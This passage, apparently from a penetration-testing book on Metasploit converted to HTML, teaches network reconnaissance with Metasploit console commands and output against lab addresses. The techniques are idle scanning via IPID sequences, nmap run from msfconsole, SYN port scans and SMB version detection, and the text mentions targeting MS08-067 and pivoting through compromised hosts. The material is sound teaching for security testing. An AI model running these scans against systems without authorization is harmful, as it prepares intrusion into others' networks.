style="text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:15pt"><td style="width:10pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:13pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">TIMEOUT</p></td><td style="width:64pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">500</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The reply read timeout in milliseconds</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">This listing displays the required options for the <span class="s19">ipidseq </span>scan. One notable one, <span class="s25">RHOSTS </span>at <span class="s32">O</span>, can take IP ranges (such as 192.168.1.20–192.168.1.30); Classless Inter-Domain Routing (CIDR) ranges (such as 192.168.1.0/24);</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">multiple ranges separated by commas (such as 192.168.1.0/24, 192.168.3.0/24); and a text file with one host per line (such as <span class="s19">file:/tmp/hostlist.txt</span>). All these options give us quite a bit of flexibility in specifying our targets.</p><p style="padding-left: 90pt;text-indent: 17pt;line-height: 81%;text-align: left;">The <span class="s25">THREADS </span>value at <span class="s32">8 </span>sets the number of concurrent threads to use while scanning. By default, all scanner modules have their <span class="s25">THREADS </span>value initially</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set to 1. We can raise this value to speed up our scans or lower it to reduce network traffic. In general, you should not set the <span class="s25">THREADS </span>value greater 16 when running Metasploit on Windows, and not greater than 128 on UNIX- like operating systems.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now let’s set our values and run the module. We’ll set the value for <span class="s25">RHO- STS </span>to 192.168.1.0/24, set <span class="s25">THREADS </span>to 50, and then run the scan.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_057.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] 192.168.1.1&#39;s IPID sequence class: All zeros</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.10&#39;s IPID sequence class: Incremental! [*] Scanned 030 of 256 hosts (011% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] 192.168.1.116&#39;s IPID sequence class: All zeros</p><p class="s30" style="padding-top: 1pt;padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] 192.168.1.109&#39;s IPID sequence class: Incremental! [*] Scanned 128 of 256 hosts (050% complete)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] 192.168.1.154&#39;s IPID sequence class: Incremental! [*] 192.168.1.155&#39;s IPID sequence class: Incremental! [*] Scanned 155 of 256 hosts (060% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.180&#39;s IPID sequence class: All zeros [*] 192.168.1.181&#39;s IPID sequence class: Incremental! [*] 192.168.1.185&#39;s IPID sequence class: All zeros [*] 192.168.1.184&#39;s IPID sequence class: Randomized [*] Scanned 232 of 256 hosts (090% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Scanned 256 of 256 hosts (100% complete) [*] Auxiliary module execution completed</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_058.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: justify;">Judging by the results of our scan, we see a number of potential idle hosts that we can use to perform idle scanning. We’ll try scanning a host using the system at 192.168.1.109 shown at <span class="s32">O </span>by using the <span class="s25">-sI </span>command line flag to</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">specify the idle host:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_059.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt; <span class="s24">nmap -PN -sI 192.168.1.109 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] exec: nmap -PN -sI 192.168.1.109 192.168.1.155</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental Interesting ports on 192.168.1.155:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Not shown: 996 closed|filtered ports PORT STATE SERVICE</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">MAC Address: 00:0C:29:E4:59:7C (VMware)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds msf auxiliary(ipidseq) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_060.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">By using the idle host, we were able to discover a number of open ports on our target system without sending a single packet to the system.</p><p class="s23" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Running Nmap from MSFconsole</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now that we’ve performed advanced enumeration on our target, let’s connect</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">nmap <span class="p">with Metasploit. To do this, we first connect to the </span>msfbook <span class="p">database:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_061.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_062.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now we should be able to enter the <span class="s25">db_nmap </span>command from within <span class="s19">msfconsole </span>to run <span class="s19">nmap </span>and have its results automatically stored in our new database.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">We’ll be attacking only one system in this instance, but you can specify IPs by CIDR notation and even ranges (for example, 192.168.1.1/24 or 192.168.1.1–254).</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_063.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_nmap -sS -A 172.16.32.131</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Warning: Traceroute does not support idle or connect scan, disabling... Nmap scan report for 172.16.32.131</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Host is up (0.00056s latency). Not shown: 990 closed ports</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PORT STATE SERVICE VERSION</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">21/tcp <span class="s30">O</span>open ftp Microsoft ftpd</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">25/tcp open smtp Microsoft ESMTP 6.0.2600.2180 <span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80/tcp open http Microsoft IIS webserver 5.1</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_html-title:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">443/tcp open https?</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM 3389/tcp open microsoft-rdp Microsoft Terminal Service</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">MAC Address: 00:0C:29:EA:26:7C (VMware)</p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 83%;text-align: left;">Device type: general purpose Running: Microsoft Windows XP|2003 <span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Network Distance: 1 hop</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Service Info: Host: ihazsecurity; OS: Windows</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host script results:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_nbstat: NetBIOS name: IHAZSECURITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:ea:26:7c</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| smb-os-discovery:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| OS: Windows XP (Windows 2000 LAN Manager)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| Name: WORKGROUP\IHAZSECURITY</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_smbv2-enabled: Server doesn&#39;t support SMBv2 protocol</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">OS and Service detection performed. Please report any incorrect results at </a>http://nmap.org/submit/. Nmap done: 1 IP address (1 host up) scanned in 33.51 seconds</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_064.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">Notice a series of open ports <span class="s32">O</span>, software versions <span class="s32">8</span>, and even a predic- tion about the target’s operating system <span class="s32">@</span>.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To check that the results from the scan are stored in the database, we run <span class="s25">db_services</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_065.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_services</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Services</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">host</p></td><td style="width:30pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 9pt;text-align: left;">port</p></td><td style="width:29pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 9pt;text-align: left;">proto</p></td><td style="width:59pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 9pt;text-align: left;">name</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">state</p></td><td style="width:179pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">info</p></td></tr><tr style="height:11pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:30pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:29pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----</p></td><td style="width:59pt"><p class="s28" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">-----</p></td><td style="width:179pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td></tr><tr style="height:11pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">172.16.32.131</p></td><td style="width:30pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">135</p></td><td style="width:29pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tcp</p></td><td style="width:59pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msrpc</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">open</p></td><td style="width:179pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft Windows RPC</p></td></tr><tr style="height:11pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">172.16.32.131</p></td><td style="width:30pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">139</p></td><td style="width:29pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tcp</p></td><td style="width:59pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">netbios-ssn</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">open</p></td><td style="width:179pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">172.16.32.131</p></td><td style="width:30pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">445</p></td><td style="width:29pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tcp</p></td><td style="width:59pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">microsoft-ds</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">open</p></td><td style="width:179pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft Windows XP microsoft-ds</p></td></tr><tr style="height:11pt"><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">172.16.32.131</p></td><td style="width:30pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">777</p></td><td style="width:29pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tcp</p></td><td style="width:59pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">unknown</p></td><td style="width:29pt"><p class="s28" style="padding-left: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">open</p></td><td style="width:179pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:15pt"><td style="width:61pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">172.16.32.131</p></td><td style="width:30pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1433</p></td><td style="width:29pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 7pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tcp</p></td><td style="width:59pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ms-sql-s</p></td><td style="width:29pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">open</p></td><td style="width:179pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft SQL Server 2005 9.00.1399; RTM</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We’re beginning to develop a picture of our target and exposed ports for use as potential attack vectors.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark96">Port Scanning with Metasploit</a><a name="bookmark114">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In addition to its ability to use third-party scanners, Metasploit has several port scanners built into its auxiliary modules that directly integrate with most aspects of the Framework. In later chapters, we’ll use these port scanners to leverage compromised systems to access and attack; his process, often called <span class="s19">pivoting</span>, allows us to use internally connected systems to route traffic to a net- work that would otherwise be inaccessible.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For example, suppose you compromise a system behind a firewall that is using Network Address Translation (NAT). The system behind the NAT-based firewall uses private IP addresses, which you cannot contact directly from the Internet. If you use Metasploit to compromise a system behind a NAT, you might be able to use that compromised internal system to pass traffic (pivot) to internally hosted and private IP-based systems to penetrate the network farther behind the firewall.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To see the list of port scanning tools that the Framework offers, enter the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_066.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">search portscan</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_067.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s conduct a simple scan of a single host using Metasploit’s SYN Port Scanner. In the following listing, we start the scan with <span class="s25">use scanner/portscan/ syn</span>, set <span class="s25">RHOSTS </span>to 192.168.1.155, set <span class="s25">THREADS </span>to 50, and then run the scan.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_068.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use scanner/portscan/syn</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(syn) &gt; <span class="s24">set RHOSTS 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(syn) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">msf auxiliary(syn) &gt; <span class="s24">run</span></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 88%;text-align: justify;">O <span class="s25">[*] TCP OPEN 192.168.1.155:135 [*] TCP OPEN 192.168.1.155:139 [*] TCP OPEN 192.168.1.155:445</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(syn) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_069.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">From the results, you can see at <span class="s32">O </span>that ports 135, 139, and 445 are open on IP address 192.168.1.155, leveraging the <span class="s19">portscan syn </span>module within Metasploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark97">Targeted Scanning</a><a name="bookmark115">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When you are conducting a penetration test, there is no shame in looking for an easy win. A <span class="s19">targeted scan </span>looks for specific operating systems, services, program versions, or configurations that are known to be exploitable and that provide an easy door into a target network. For example, it is common to scan a target network quickly for the vulnerability MS08-067, as this is (still) an extremely common hole that will give you SYSTEM access much more quickly than scanning an entire target network for vulnerabilities.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark98">Server Message Block Scanning</a><a name="bookmark116">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit can scour a network and attempt to identify versions of Microsoft Windows using its <span class="s19">smb_version </span>module.</p><p class="s22" style="padding-top: 8pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">If you are not familiar with Server Message Block (SMB, a common file-sharing protocol), study up a bit on the different protocols and their purposes before you continue. You will need to understand basic port information to learn how to attack a system successfully.</span></p><p style="padding-top: 5pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">We run the module, list our options, set <span class="s25">RHOSTS</span>, and begin scanning:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_070.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use scanner/smb/smb_version</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_version) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:25pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS THREADS</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 20pt;text-indent: 0pt;line-height: 11pt;text-align: left;">yes yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 1pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The target address range or CIDR identifier The number of concurrent threads</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_version) &gt; <span class="s24">set RHOSTS 192.168.1.155</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 53pt;text-indent: -29pt;line-height: 80%;text-align: left;">O <span class="s25">[*] 192.168.1.155 is running Windows XP Service Pack 2 (language: English) (name:DOOKIE-FA154354) (domain:WORKGROUP)</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_071.png"/></span></p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">As you can see 